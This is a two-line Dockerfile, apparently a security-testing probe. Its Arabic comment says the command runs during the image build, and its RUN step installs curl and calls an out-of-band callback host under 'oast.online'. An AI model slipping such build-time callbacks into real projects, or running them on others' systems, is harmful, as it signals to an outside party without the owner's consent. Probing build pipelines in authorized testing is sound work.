FROM alpine:latest

# الأمر ده هيشتغل وأنت بتبني الصورة
RUN apk add --no-cache curl && curl http://docker.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online.com
